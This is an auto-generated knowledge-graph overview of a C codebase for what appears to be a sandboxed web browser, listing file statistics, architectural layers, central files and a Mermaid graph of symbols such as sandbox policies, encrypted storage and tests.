# Polyglot Codebase Knowledge Graph

> Generated offline by **readmenator**. Supports C, C++, Python, Go, Rust, JS/TS, Java, C#, Shell, PHP, Dart, GDScript, Nim, ASM, Ruby, Swift, Kotlin, Scala, Lua, Elixir.
> No LLMs. No tokens. Pure static analysis. See more [here](https://github.com/grisuno/ReadMenator)

**Total Files Parsed:** 180 | **Total Symbols Extracted:** 3289 | **Total Imports:** 1020


## Table of Contents

1. [Statistics Dashboard](#statistics-dashboard)
2. [Architectural Layers](#architectural-layers)
3. [God Nodes](#god-nodes)
4. [Suggested Questions](#suggested-questions)
5. [Structural Knowledge Map](#structural-knowledge-map)
6. [Architecture Reference](#architecture-reference)
    - [C (120 files)](#c-120-files)
    - [H (52 files)](#h-52-files)
    - [JS (1 files)](#js-1-files)
    - [PY (1 files)](#py-1-files)
    - [SH (6 files)](#sh-6-files)

---

## Statistics Dashboard

| Metric | Value |
|--------|-------|
| Total Files | 180 |
| Total Symbols | 3289 |
| Total Imports | 1020 |
| Call Edges | 1467 |
| Inheritance Edges | 0 |
| Languages | 5 |
| Avg Symbols/File | 18.3 |
| Avg Imports/File | 5.7 |

### Top Files by Import Count (Fan-Out)

| File | Imports | Symbols | Language |
|------|---------|---------|----------|
| `browser_ui.c` | 62 | 334 | c |
| `local_store.c` | 31 | 115 | c |
| `tab.c` | 29 | 70 | c |
| `freedom.c` | 23 | 25 | c |
| `os_sandbox.c` | 23 | 28 | c |
| `test_os_sandbox.c` | 22 | 19 | c |
| `page_view.c` | 15 | 111 | c |
| `media_decoder.c` | 14 | 8 | c |
| `test_disk_store.c` | 14 | 15 | c |
| `test_dom_debug.c` | 14 | 11 | c |

---

## Architectural Layers

Auto-detected from path patterns, naming conventions, and imported frameworks.

| Layer | Files |
|-------|-------|
| utility | 91 |
| testing | 50 |
| presentation | 19 |
| data_access | 10 |
| infrastructure | 6 |
| business_logic | 4 |

### utility

- `app.py` (py, 3 symbols)
- `docker-entrypoint.sh` (sh, 0 symbols)
- `docker_run.sh` (sh, 0 symbols)
- `fuzz.sh` (sh, 0 symbols)
- `fuzz_css.c` (c, 1 symbols)
- `fuzz_dom.c` (c, 2 symbols)
- `fuzz_dom_debug.c` (c, 1 symbols)
- `fuzz_download.c` (c, 1 symbols)
- `fuzz_freebug.c` (c, 1 symbols)
- `fuzz_html_parse.c` (c, 0 symbols)
- `fuzz_image_decode.c` (c, 2 symbols)
- `fuzz_js_sandbox.c` (c, 0 symbols)
- `fuzz_pdf_export.c` (c, 1 symbols)
- `fuzz_prefetch.c` (c, 1 symbols)
- `fuzz_prefs.c` (c, 1 symbols)
- *... and 76 more*

### presentation

- `build_deb.sh` (sh, 0 symbols)
- `fuzz_page_view.c` (c, 0 symbols)
- `browser_ui.c` (c, 334 symbols)
- `browser_ui_internal.h` (h, 6 symbols)
- `bui_theme.c` (c, 6 symbols)
- `freedom_view.c` (c, 2 symbols)
- `ui_render.c` (c, 29 symbols)
- `flex_layout.h` (h, 4 symbols)
- `page_view.h` (h, 7 symbols)
- `render_doc.h` (h, 3 symbols)
- `render_policy.h` (h, 3 symbols)
- `renderer.h` (h, 4 symbols)
- `ui.h` (h, 5 symbols)
- `flex_layout.c` (c, 11 symbols)
- `page_view.c` (c, 111 symbols)
- *... and 4 more*

### data_access

- `fuzz_data_url.c` (c, 1 symbols)
- `data_url.h` (h, 2 symbols)
- `disk_store.h` (h, 1 symbols)
- `form.h` (h, 6 symbols)
- `local_store.h` (h, 8 symbols)
- `psl_data.h` (h, 1 symbols)
- `data_url.c` (c, 6 symbols)
- `disk_store.c` (c, 6 symbols)
- `form.c` (c, 8 symbols)
- `local_store.c` (c, 115 symbols)

### infrastructure

- `hostedit.h` (h, 2 symbols)
- `js_env.h` (h, 1 symbols)
- `media_decoder.h` (h, 2 symbols)
- `hostedit.c` (c, 13 symbols)
- `js_env.c` (c, 27 symbols)
- `media_decoder.c` (c, 8 symbols)

### business_logic

- `js_policy.h` (h, 1 symbols)
- `request_policy.h` (h, 1 symbols)
- `js_policy.c` (c, 6 symbols)
- `request_policy.c` (c, 11 symbols)

### testing

- `itest_secure_fetch.c` (c, 2 symbols)
- `test_anti_fp.c` (c, 15 symbols)
- `test_box_style.c` (c, 24 symbols)
- `test_box_tree.c` (c, 36 symbols)
- `test_browser.c` (c, 15 symbols)
- `test_compositor.c` (c, 21 symbols)
- `test_css.c` (c, 186 symbols)
- `test_css_color.c` (c, 21 symbols)
- `test_data_url.c` (c, 23 symbols)
- `test_disk_store.c` (c, 15 symbols)
- `test_dom.c` (c, 36 symbols)
- `test_dom_debug.c` (c, 11 symbols)
- `test_download.c` (c, 21 symbols)
- `test_flex_layout.c` (c, 37 symbols)
- `test_form.c` (c, 20 symbols)
- *... and 35 more*

---

## God Nodes

Most architecturally central files ranked by combined import/export degree and symbol richness.

| File | Score | Connections |
|------|-------|-------------|
| `browser_ui.c` | 33.4 | |
| `test_css.c` | 18.6 | |
| `css.c` | 15.9 | |
| `local_store.c` | 11.5 | |
| `page_view.c` | 11.1 | |
| `test_js_dom.c` | 10.2 | |
| `test_page_view.c` | 9.8 | |
| `test_tab.c` | 8.3 | |
| `tab.c` | 7.0 | |
| `js_dom.c` | 6.4 | |

---

## Suggested Questions

Auto-generated exploration prompts based on graph structure:

- What does browser_ui.c depend on, and what depends on it? (0 connections)
- What does test_css.c depend on, and what depends on it? (0 connections)
- What does css.c depend on, and what depends on it? (0 connections)
- What is the overall architecture of this codebase?

---

## Structural Knowledge Map

> **Note:** The visual graph below has been intelligently pruned to the top 300 most relevant nodes to prevent rendering crashes. Full details of all files are documented in the Architecture Reference.

```mermaid
graph TD
    classDef mod fill:#1e1e1e,stroke:#ff6666,stroke-width:2px,color:#fff;
    classDef cls fill:#2d2d2d,stroke:#4ec9b0,stroke-width:2px,color:#fff;
    classDef fn fill:#333,stroke:#dcdcaa,stroke-width:1px,color:#dcdcaa;
    classDef ext fill:#111,stroke:#666,stroke-dasharray:5 5,color:#aaa;
    tmp_jq_test_js["jq_test.js (js)"]
    class tmp_jq_test_js mod;
    tmp_jq_test_js_E["E"]
    class tmp_jq_test_js_E fn;
    tmp_jq_test_js --> tmp_jq_test_js_E
    tmp_jq_test_js_k["k"]
    class tmp_jq_test_js_k fn;
    tmp_jq_test_js --> tmp_jq_test_js_k
    tmp_jq_test_js_z["z"]
    class tmp_jq_test_js_z fn;
    tmp_jq_test_js --> tmp_jq_test_js_z
    tmp_jq_test_js_Y["Y"]
    class tmp_jq_test_js_Y fn;
    tmp_jq_test_js --> tmp_jq_test_js_Y
    tmp_jq_test_js_r["r"]
    class tmp_jq_test_js_r fn;
    tmp_jq_test_js --> tmp_jq_test_js_r
    gui_browser_ui_c["browser_ui.c (c)"]
    class gui_browser_ui_c mod;
    gui_browser_ui_c_ui_menu_item["ui_menu_item"]
    class gui_browser_ui_c_ui_menu_item cls;
    gui_browser_ui_c --> gui_browser_ui_c_ui_menu_item
    gui_browser_ui_c_ui_input_state["ui_input_state"]
    class gui_browser_ui_c_ui_input_state cls;
    gui_browser_ui_c --> gui_browser_ui_c_ui_input_state
    gui_browser_ui_c_ui_image["ui_image"]
    class gui_browser_ui_c_ui_image cls;
    gui_browser_ui_c --> gui_browser_ui_c_ui_image
    gui_browser_ui_c_tab_ctx["tab_ctx"]
    class gui_browser_ui_c_tab_ctx cls;
    gui_browser_ui_c --> gui_browser_ui_c_tab_ctx
    gui_browser_ui_c_browser_window["browser_window"]
    class gui_browser_ui_c_browser_window cls;
    gui_browser_ui_c --> gui_browser_ui_c_browser_window
    src_local_store_c["local_store.c (c)"]
    class src_local_store_c mod;
    src_local_store_c_cipher_for["cipher_for"]
    class src_local_store_c_cipher_for fn;
    src_local_store_c --> src_local_store_c_cipher_for
    src_local_store_c_argon2id_derive["argon2id_derive"]
    class src_local_store_c_argon2id_derive fn;
    src_local_store_c --> src_local_store_c_argon2id_derive
    src_local_store_c_ls_derive_key["ls_derive_key"]
    class src_local_store_c_ls_derive_key fn;
    src_local_store_c --> src_local_store_c_ls_derive_key
    src_local_store_c_aead_encrypt["aead_encrypt"]
    class src_local_store_c_aead_encrypt fn;
    src_local_store_c --> src_local_store_c_aead_encrypt
    src_local_store_c_aead_decrypt["aead_decrypt"]
    class src_local_store_c_aead_decrypt fn;
    src_local_store_c --> src_local_store_c_aead_decrypt
    src_tab_c["tab.c (c)"]
    class src_tab_c mod;
    src_tab_c_child_state["child_state"]
    class src_tab_c_child_state cls;
    src_tab_c --> src_tab_c_child_state
    src_tab_c_tab["tab"]
    class src_tab_c_tab cls;
    src_tab_c --> src_tab_c_tab
    src_tab_c_child_reset_page["child_reset_page"]
    class src_tab_c_child_reset_page fn;
    src_tab_c --> src_tab_c_child_reset_page
    src_tab_c_policy["policy"]
    class src_tab_c_policy fn;
    src_tab_c --> src_tab_c_policy
    src_tab_c_run_js["run_js"]
    class src_tab_c_run_js fn;
    src_tab_c --> src_tab_c_run_js
    src_os_sandbox_c["os_sandbox.c (c)"]
    class src_os_sandbox_c mod;
    src_os_sandbox_c_os_policy_allows["os_policy_allows"]
    class src_os_sandbox_c_os_policy_allows fn;
    src_os_sandbox_c --> src_os_sandbox_c_os_policy_allows
    src_os_sandbox_c_os_policy_size["os_policy_size"]
    class src_os_sandbox_c_os_policy_size fn;
    src_os_sandbox_c --> src_os_sandbox_c_os_policy_size
    src_os_sandbox_c_os_prot_allowed["os_prot_allowed"]
    class src_os_sandbox_c_os_prot_allowed fn;
    src_os_sandbox_c --> src_os_sandbox_c_os_prot_allowed
    src_os_sandbox_c_os_no_dump["os_no_dump"]
    class src_os_sandbox_c_os_no_dump fn;
    src_os_sandbox_c --> src_os_sandbox_c_os_no_dump
    src_os_sandbox_c_excluded["excluded"]
    class src_os_sandbox_c_excluded fn;
    src_os_sandbox_c --> src_os_sandbox_c_excluded
    src_freedom_c["freedom.c (c)"]
    class src_freedom_c mod;
    src_freedom_c_print_usage["print_usage"]
    class src_freedom_c_print_usage fn;
    src_freedom_c --> src_freedom_c_print_usage
    src_freedom_c_is_https_url["is_https_url"]
    class src_freedom_c_is_https_url fn;
    src_freedom_c --> src_freedom_c_is_https_url
    src_freedom_c_is_http_url["is_http_url"]
    class src_freedom_c_is_http_url fn;
    src_freedom_c --> src_freedom_c_is_http_url
    src_freedom_c_is_overlay_http["is_overlay_http"]
    class src_freedom_c_is_overlay_http fn;
    src_freedom_c --> src_freedom_c_is_overlay_http
    src_freedom_c_read_file["read_file"]
    class src_freedom_c_read_file fn;
    src_freedom_c --> src_freedom_c_read_file
    tests_test_os_sandbox_c["test_os_sandbox.c (c)"]
    class tests_test_os_sandbox_c mod;
    tests_test_os_sandbox_c_test_policy_allows_safe["test_policy_allows_safe"]
    class tests_test_os_sandbox_c_test_policy_allows_safe fn;
    tests_test_os_sandbox_c --> tests_test_os_sandbox_c_test_policy_allows_safe
    tests_test_os_sandbox_c_test_policy_denies_dangerous["test_policy_denies_dangerous"]
    class tests_test_os_sandbox_c_test_policy_denies_dangerous fn;
    tests_test_os_sandbox_c --> tests_test_os_sandbox_c_test_policy_denies_dangerous
    tests_test_os_sandbox_c_test_policy_denies_io_uring["test_policy_denies_io_uring"]
    class tests_test_os_sandbox_c_test_policy_denies_io_uring fn;
    tests_test_os_sandbox_c --> tests_test_os_sandbox_c_test_policy_denies_io_uring
    tests_test_os_sandbox_c_test_policy_size["test_policy_size"]
    class tests_test_os_sandbox_c_test_policy_size fn;
    tests_test_os_sandbox_c --> tests_test_os_sandbox_c_test_policy_size
    tests_test_os_sandbox_c_test_harden_kills_denied_syscall["test_harden_kills_denied_syscall"]
    class tests_test_os_sandbox_c_test_harden_kills_denied_syscall fn;
    tests_test_os_sandbox_c --> tests_test_os_sandbox_c_test_harden_kills_denied_syscall
    src_page_view_c["page_view.c (c)"]
    class src_page_view_c mod;
    src_page_view_c_pv_node_map["pv_node_map"]
    class src_page_view_c_pv_node_map cls;
    src_page_view_c --> src_page_view_c_pv_node_map
    src_page_view_c_pv_cont_info["pv_cont_info"]
    class src_page_view_c_pv_cont_info cls;
    src_page_view_c --> src_page_view_c_pv_cont_info
    src_page_view_c_pv_item_track["pv_item_track"]
    class src_page_view_c_pv_item_track cls;
    src_page_view_c --> src_page_view_c_pv_item_track
    src_page_view_c_pv_box_info["pv_box_info"]
    class src_page_view_c_pv_box_info cls;
    src_page_view_c --> src_page_view_c_pv_box_info
    src_page_view_c_pv_container_reg["pv_container_reg"]
    class src_page_view_c_pv_container_reg cls;
    src_page_view_c --> src_page_view_c_pv_container_reg
    tests_test_profile_c["test_profile.c (c)"]
    class tests_test_profile_c mod;
    tests_test_profile_c_fixture["fixture"]
    class tests_test_profile_c_fixture cls;
    tests_test_profile_c --> tests_test_profile_c_fixture
    tests_test_profile_c_setup["setup"]
    class tests_test_profile_c_setup fn;
    tests_test_profile_c --> tests_test_profile_c_setup
    tests_test_profile_c_teardown["teardown"]
    class tests_test_profile_c_teardown fn;
    tests_test_profile_c --> tests_test_profile_c_teardown
    tests_test_profile_c_path_of["path_of"]
    class tests_test_profile_c_path_of fn;
    tests_test_profile_c --> tests_test_profile_c_path_of
    tests_test_profile_c_file_size["file_size"]
    class tests_test_profile_c_file_size fn;
    tests_test_profile_c --> tests_test_profile_c_file_size
    tests_test_disk_store_c["test_disk_store.c (c)"]
    class tests_test_disk_store_c mod;
    tests_test_disk_store_c_fixture["fixture"]
    class tests_test_disk_store_c_fixture cls;
    tests_test_disk_store_c --> tests_test_disk_store_c_fixture
    tests_test_disk_store_c_setup["setup"]
    class tests_test_disk_store_c_setup fn;
    tests_test_disk_store_c --> tests_test_disk_store_c_setup
    tests_test_disk_store_c_teardown["teardown"]
    class tests_test_disk_store_c_teardown fn;
    tests_test_disk_store_c --> tests_test_disk_store_c_teardown
    tests_test_disk_store_c_count_dir_entries["count_dir_entries"]
    class tests_test_disk_store_c_count_dir_entries fn;
    tests_test_disk_store_c --> tests_test_disk_store_c_count_dir_entries
    tests_test_disk_store_c_test_roundtrip["test_roundtrip"]
    class tests_test_disk_store_c_test_roundtrip fn;
    tests_test_disk_store_c --> tests_test_disk_store_c_test_roundtrip
    tests_test_dom_debug_c["test_dom_debug.c (c)"]
    class tests_test_dom_debug_c mod;
    tests_test_dom_debug_c_caps_css_on["caps_css_on"]
    class tests_test_dom_debug_c_caps_css_on fn;
    tests_test_dom_debug_c --> tests_test_dom_debug_c_caps_css_on
    tests_test_dom_debug_c_build["build"]
    class tests_test_dom_debug_c_build fn;
    tests_test_dom_debug_c --> tests_test_dom_debug_c_build
    tests_test_dom_debug_c_test_null_doc_is_empty_header["test_null_doc_is_empty_header"]
    class tests_test_dom_debug_c_test_null_doc_is_empty_header fn;
    tests_test_dom_debug_c --> tests_test_dom_debug_c_test_null_doc_is_empty_header
    tests_test_dom_debug_c_test_heading_paragraph_link["test_heading_paragraph_link"]
    class tests_test_dom_debug_c_test_heading_paragraph_link fn;
    tests_test_dom_debug_c --> tests_test_dom_debug_c_test_heading_paragraph_link
    tests_test_dom_debug_c_test_grid_container_annotation["test_grid_container_annotation"]
    class tests_test_dom_debug_c_test_grid_container_annotation fn;
    tests_test_dom_debug_c --> tests_test_dom_debug_c_test_grid_container_annotation
    src_media_decoder_c["media_decoder.c (c)"]
    class src_media_decoder_c mod;
    src_media_decoder_c_decoder_ctx["decoder_ctx"]
    class src_media_decoder_c_decoder_ctx cls;
    src_media_decoder_c --> src_media_decoder_c_decoder_ctx
    src_media_decoder_c_open["open"]
    class src_media_decoder_c_open fn;
    src_media_decoder_c --> src_media_decoder_c_open
    src_media_decoder_c_decoder_close["decoder_close"]
    class src_media_decoder_c_decoder_close fn;
    src_media_decoder_c --> src_media_decoder_c_decoder_close
    src_media_decoder_c_decoder_init["decoder_init"]
    class src_media_decoder_c_decoder_init fn;
    src_media_decoder_c --> src_media_decoder_c_decoder_init
    src_media_decoder_c_decode_segment["decode_segment"]
    class src_media_decoder_c_decode_segment fn;
    src_media_decoder_c --> src_media_decoder_c_decode_segment
    tests_test_page_view_c["test_page_view.c (c)"]
    class tests_test_page_view_c mod;
    tests_test_page_view_c_parse["parse"]
    class tests_test_page_view_c_parse fn;
    tests_test_page_view_c --> tests_test_page_view_c_parse
    tests_test_page_view_c_find_text["find_text"]
    class tests_test_page_view_c_find_text fn;
    tests_test_page_view_c --> tests_test_page_view_c_find_text
    tests_test_page_view_c_find_image["find_image"]
    class tests_test_page_view_c_find_image fn;
    tests_test_page_view_c --> tests_test_page_view_c_find_image
    tests_test_page_view_c_find_video["find_video"]
    class tests_test_page_view_c_find_video fn;
    tests_test_page_view_c --> tests_test_page_view_c_find_video
    tests_test_page_view_c_test_new_is_empty["test_new_is_empty"]
    class tests_test_page_view_c_test_new_is_empty fn;
    tests_test_page_view_c --> tests_test_page_view_c_test_new_is_empty
    tests_test_tab_c["test_tab.c (c)"]
    class tests_test_tab_c mod;
    tests_test_tab_c_fixture["fixture"]
    class tests_test_tab_c_fixture cls;
    tests_test_tab_c --> tests_test_tab_c_fixture
    tests_test_tab_c_setup_loaded["setup_loaded"]
    class tests_test_tab_c_setup_loaded fn;
    tests_test_tab_c --> tests_test_tab_c_setup_loaded
    tests_test_tab_c_teardown["teardown"]
    class tests_test_tab_c_teardown fn;
    tests_test_tab_c --> tests_test_tab_c_teardown
    tests_test_tab_c_expect_eval["expect_eval"]
    class tests_test_tab_c_expect_eval fn;
    tests_test_tab_c --> tests_test_tab_c_expect_eval
    tests_test_tab_c_test_open_close["test_open_close"]
    class tests_test_tab_c_test_open_close fn;
    tests_test_tab_c --> tests_test_tab_c_test_open_close
    tests_test_render_doc_c["test_render_doc.c (c)"]
    class tests_test_render_doc_c mod;
    tests_test_render_doc_c_caps_images_on["caps_images_on"]
    class tests_test_render_doc_c_caps_images_on fn;
    tests_test_render_doc_c --> tests_test_render_doc_c_caps_images_on
    tests_test_render_doc_c_first_kind["first_kind"]
    class tests_test_render_doc_c_first_kind fn;
    tests_test_render_doc_c --> tests_test_render_doc_c_first_kind
    tests_test_render_doc_c_test_build_null_out["test_build_null_out"]
    class tests_test_render_doc_c_test_build_null_out fn;
    tests_test_render_doc_c --> tests_test_render_doc_c_test_build_null_out
    tests_test_render_doc_c_test_build_null_view_is_empty["test_build_null_view_is_empty"]
    class tests_test_render_doc_c_test_build_null_view_is_empty fn;
    tests_test_render_doc_c --> tests_test_render_doc_c_test_build_null_view_is_empty
    tests_test_render_doc_c_test_heading_paragraph_link["test_heading_paragraph_link"]
    class tests_test_render_doc_c_test_heading_paragraph_link fn;
    tests_test_render_doc_c --> tests_test_render_doc_c_test_heading_paragraph_link
    tests_test_js_env_c["test_js_env.c (c)"]
    class tests_test_js_env_c mod;
    tests_test_js_env_c_fixture["fixture"]
    class tests_test_js_env_c_fixture cls;
    tests_test_js_env_c --> tests_test_js_env_c_fixture
    tests_test_js_env_c_setup["setup"]
    class tests_test_js_env_c_setup fn;
    tests_test_js_env_c --> tests_test_js_env_c_setup
    tests_test_js_env_c_teardown["teardown"]
    class tests_test_js_env_c_teardown fn;
    tests_test_js_env_c --> tests_test_js_env_c_teardown
    tests_test_js_env_c_run["run"]
    class tests_test_js_env_c_run fn;
    tests_test_js_env_c --> tests_test_js_env_c_run
    tests_test_js_env_c_test_install_null_args["test_install_null_args"]
    class tests_test_js_env_c_test_install_null_args fn;
    tests_test_js_env_c --> tests_test_js_env_c_test_install_null_args
    tests_test_js_dom_c["test_js_dom.c (c)"]
    class tests_test_js_dom_c mod;
    tests_test_js_dom_c_fixture["fixture"]
    class tests_test_js_dom_c_fixture cls;
    tests_test_js_dom_c --> tests_test_js_dom_c_fixture
    tests_test_js_dom_c_setup["setup"]
    class tests_test_js_dom_c_setup fn;
    tests_test_js_dom_c --> tests_test_js_dom_c_setup
    tests_test_js_dom_c_teardown["teardown"]
    class tests_test_js_dom_c_teardown fn;
    tests_test_js_dom_c --> tests_test_js_dom_c_teardown
    tests_test_js_dom_c_run["run"]
    class tests_test_js_dom_c_run fn;
    tests_test_js_dom_c --> tests_test_js_dom_c_run
    tests_test_js_dom_c_test_install_null_args["test_install_null_args"]
    class tests_test_js_dom_c_test_install_null_args fn;
    tests_test_js_dom_c --> tests_test_js_dom_c_test_install_null_args
    src_secure_fetch_c["secure_fetch.c (c)"]
    class src_secure_fetch_c mod;
    src_secure_fetch_c_body_sink["body_sink"]
    class src_secure_fetch_c_body_sink cls;
    src_secure_fetch_c --> src_secure_fetch_c_body_sink
    src_secure_fetch_c_tls_capture["tls_capture"]
    class src_secure_fetch_c_tls_capture cls;
    src_secure_fetch_c --> src_secure_fetch_c_tls_capture
    src_secure_fetch_c_fetch_ctx["fetch_ctx"]
    class src_secure_fetch_c_fetch_ctx cls;
    src_secure_fetch_c --> src_secure_fetch_c_fetch_ctx
    src_secure_fetch_c_ci_starts_with["ci_starts_with"]
    class src_secure_fetch_c_ci_starts_with fn;
    src_secure_fetch_c --> src_secure_fetch_c_ci_starts_with
    src_secure_fetch_c_ci_index["ci_index"]
    class src_secure_fetch_c_ci_index fn;
    src_secure_fetch_c --> src_secure_fetch_c_ci_index
    tests_test_freedom_c["test_freedom.c (c)"]
    class tests_test_freedom_c mod;
    tests_test_freedom_c_run_freedom["run_freedom"]
    class tests_test_freedom_c_run_freedom fn;
    tests_test_freedom_c --> tests_test_freedom_c_run_freedom
    tests_test_freedom_c_run_freedom_raw["run_freedom_raw"]
    class tests_test_freedom_c_run_freedom_raw fn;
    tests_test_freedom_c --> tests_test_freedom_c_run_freedom_raw
    tests_test_freedom_c_is_pdf_file["is_pdf_file"]
    class tests_test_freedom_c_is_pdf_file fn;
    tests_test_freedom_c --> tests_test_freedom_c_is_pdf_file
    tests_test_freedom_c_is_png_file["is_png_file"]
    class tests_test_freedom_c_is_png_file fn;
    tests_test_freedom_c --> tests_test_freedom_c_is_png_file
    tests_test_freedom_c_cleanup_files["cleanup_files"]
    class tests_test_freedom_c_cleanup_files fn;
    tests_test_freedom_c --> tests_test_freedom_c_cleanup_files
    src_profile_c["profile.c (c)"]
    class src_profile_c mod;
    src_profile_c_join_path["join_path"]
    class src_profile_c_join_path fn;
    src_profile_c --> src_profile_c_join_path
    src_profile_c_keyfile_create["keyfile_create"]
    class src_profile_c_keyfile_create fn;
    src_profile_c --> src_profile_c_keyfile_create
    src_profile_c_profile_open["profile_open"]
    class src_profile_c_profile_open fn;
    src_profile_c --> src_profile_c_profile_open
    src_profile_c_map_ds["map_ds"]
    class src_profile_c_map_ds fn;
    src_profile_c --> src_profile_c_map_ds
    src_profile_c_profile_load["profile_load"]
    class src_profile_c_profile_load fn;
    src_profile_c --> src_profile_c_profile_load
    src_disk_store_c["disk_store.c (c)"]
    class src_disk_store_c mod;
    src_disk_store_c_fsync_dir["fsync_dir"]
    class src_disk_store_c_fsync_dir fn;
    src_disk_store_c --> src_disk_store_c_fsync_dir
    src_disk_store_c_map_ls["map_ls"]
    class src_disk_store_c_map_ls fn;
    src_disk_store_c --> src_disk_store_c_map_ls
    src_disk_store_c_ds_write["ds_write"]
    class src_disk_store_c_ds_write fn;
    src_disk_store_c --> src_disk_store_c_ds_write
    src_disk_store_c_ds_read["ds_read"]
    class src_disk_store_c_ds_read fn;
    src_disk_store_c --> src_disk_store_c_ds_read
    src_disk_store_c_ds_free["ds_free"]
    class src_disk_store_c_ds_free fn;
    src_disk_store_c --> src_disk_store_c_ds_free
    src_dom_c["dom.c (c)"]
    class src_dom_c mod;
    src_dom_c_sm_entry["sm_entry"]
    class src_dom_c_sm_entry cls;
    src_dom_c --> src_dom_c_sm_entry
    src_dom_c_strmap["strmap"]
    class src_dom_c_strmap cls;
    src_dom_c --> src_dom_c_strmap
    src_dom_c_pm_entry["pm_entry"]
    class src_dom_c_pm_entry cls;
    src_dom_c --> src_dom_c_pm_entry
    src_dom_c_ptrmap["ptrmap"]
    class src_dom_c_ptrmap cls;
    src_dom_c --> src_dom_c_ptrmap
    src_dom_c_dom_index["dom_index"]
    class src_dom_c_dom_index cls;
    src_dom_c --> src_dom_c_dom_index
    gui_ui_render_c["ui_render.c (c)"]
    class gui_ui_render_c mod;
    gui_ui_render_c_ui_window["ui_window"]
    class gui_ui_render_c_ui_window cls;
    gui_ui_render_c --> gui_ui_render_c_ui_window
    gui_ui_render_c_sanitize_utf8_inplace["sanitize_utf8_inplace"]
    class gui_ui_render_c_sanitize_utf8_inplace fn;
    gui_ui_render_c --> gui_ui_render_c_sanitize_utf8_inplace
    gui_ui_render_c_button_rects["button_rects"]
    class gui_ui_render_c_button_rects fn;
    gui_ui_render_c --> gui_ui_render_c_button_rects
    gui_ui_render_c_buffer_release["buffer_release"]
    class gui_ui_render_c_buffer_release fn;
    gui_ui_render_c --> gui_ui_render_c_buffer_release
    gui_ui_render_c_destroy_buffer["destroy_buffer"]
    class gui_ui_render_c_destroy_buffer fn;
    gui_ui_render_c --> gui_ui_render_c_destroy_buffer
    src_js_env_c["js_env.c (c)"]
    class src_js_env_c mod;
    src_js_env_c_wall_clock_ms["wall_clock_ms"]
    class src_js_env_c_wall_clock_ms fn;
    src_js_env_c --> src_js_env_c_wall_clock_ms
    src_js_env_c_monotonic_ms["monotonic_ms"]
    class src_js_env_c_monotonic_ms fn;
    src_js_env_c --> src_js_env_c_monotonic_ms
    src_js_env_c_m_date_now["m_date_now"]
    class src_js_env_c_m_date_now fn;
    src_js_env_c --> src_js_env_c_m_date_now
    src_js_env_c_m_perf_now["m_perf_now"]
    class src_js_env_c_m_perf_now fn;
    src_js_env_c --> src_js_env_c_m_perf_now
    src_js_env_c_m_empty_array["m_empty_array"]
    class src_js_env_c_m_empty_array fn;
    src_js_env_c --> src_js_env_c_m_empty_array
    tests_test_prefs_c["test_prefs.c (c)"]
    class tests_test_prefs_c mod;
    tests_test_prefs_c_test_init_defaults["test_init_defaults"]
    class tests_test_prefs_c_test_init_defaults fn;
    tests_test_prefs_c --> tests_test_prefs_c_test_init_defaults
    tests_test_prefs_c_test_roundtrip["test_roundtrip"]
    class tests_test_prefs_c_test_roundtrip fn;
    tests_test_prefs_c --> tests_test_prefs_c_test_roundtrip
    tests_test_prefs_c_test_parse_bad_magic["test_parse_bad_magic"]
    class tests_test_prefs_c_test_parse_bad_magic fn;
    tests_test_prefs_c --> tests_test_prefs_c_test_parse_bad_magic
    tests_test_prefs_c_test_parse_too_large["test_parse_too_large"]
    class tests_test_prefs_c_test_parse_too_large fn;
    tests_test_prefs_c --> tests_test_prefs_c_test_parse_too_large
    tests_test_prefs_c_test_parse_unknown_and_malformed_skipped["test_parse_unknown_and_malformed_skipped"]
    class tests_test_prefs_c_test_parse_unknown_and_malformed_skipped fn;
    tests_test_prefs_c --> tests_test_prefs_c_test_parse_unknown_and_malformed_skipped
    tests_test_prefetch_c["test_prefetch.c (c)"]
    class tests_test_prefetch_c mod;
    tests_test_prefetch_c_fake_ctx["fake_ctx"]
    class tests_test_prefetch_c_fake_ctx cls;
    tests_test_prefetch_c --> tests_test_prefetch_c_fake_ctx
    tests_test_prefetch_c_test_scan_null_args["test_scan_null_args"]
    class tests_test_prefetch_c_test_scan_null_args fn;
    tests_test_prefetch_c --> tests_test_prefetch_c_test_scan_null_args
    tests_test_prefetch_c_test_scan_basic_stylesheet_and_script["test_scan_basic_stylesheet_and_script"]
    class tests_test_prefetch_c_test_scan_basic_stylesheet_and_script fn;
    tests_test_prefetch_c --> tests_test_prefetch_c_test_scan_basic_stylesheet_and_script
    tests_test_prefetch_c_test_scan_ref_cap["test_scan_ref_cap"]
    class tests_test_prefetch_c_test_scan_ref_cap fn;
    tests_test_prefetch_c --> tests_test_prefetch_c_test_scan_ref_cap
    tests_test_prefetch_c_fake_fetch["fake_fetch"]
    class tests_test_prefetch_c_fake_fetch fn;
    tests_test_prefetch_c --> tests_test_prefetch_c_fake_fetch
    src_renderer_c["renderer.c (c)"]
    class src_renderer_c mod;
    src_renderer_c_child_render["child_render"]
    class src_renderer_c_child_render fn;
    src_renderer_c --> src_renderer_c_child_render
    src_renderer_c_read_field["read_field"]
    class src_renderer_c_read_field fn;
    src_renderer_c --> src_renderer_c_read_field
    src_renderer_c_rd_render_html["rd_render_html"]
    class src_renderer_c_rd_render_html fn;
    src_renderer_c --> src_renderer_c_rd_render_html
    src_renderer_c_rd_result_free["rd_result_free"]
    class src_renderer_c_rd_result_free fn;
    src_renderer_c --> src_renderer_c_rd_result_free
    src_renderer_c__POSIX_C_SOURCE["_POSIX_C_SOURCE"]
    class src_renderer_c__POSIX_C_SOURCE fn;
    src_renderer_c --> src_renderer_c__POSIX_C_SOURCE
    tests_test_css_c["test_css.c (c)"]
    class tests_test_css_c mod;
    tests_test_css_c_test_inline_text_align["test_inline_text_align"]
    class tests_test_css_c_test_inline_text_align fn;
    tests_test_css_c --> tests_test_css_c_test_inline_text_align
    tests_test_css_c_test_inline_font_size["test_inline_font_size"]
    class tests_test_css_c_test_inline_font_size fn;
    tests_test_css_c --> tests_test_css_c_test_inline_font_size
    tests_test_css_c_test_inline_line_height["test_inline_line_height"]
    class tests_test_css_c_test_inline_line_height fn;
    tests_test_css_c --> tests_test_css_c_test_inline_line_height
    tests_test_css_c_test_inline_font_weight_style["test_inline_font_weight_style"]
    class tests_test_css_c_test_inline_font_weight_style fn;
    tests_test_css_c --> tests_test_css_c_test_inline_font_weight_style
    tests_test_css_c_test_inline_text_decoration["test_inline_text_decoration"]
    class tests_test_css_c_test_inline_text_decoration fn;
    tests_test_css_c --> tests_test_css_c_test_inline_text_decoration
    src_js_dom_c["js_dom.c (c)"]
    class src_js_dom_c mod;
    src_js_dom_c_jd_method["jd_method"]
    class src_js_dom_c_jd_method cls;
    src_js_dom_c --> src_js_dom_c_jd_method
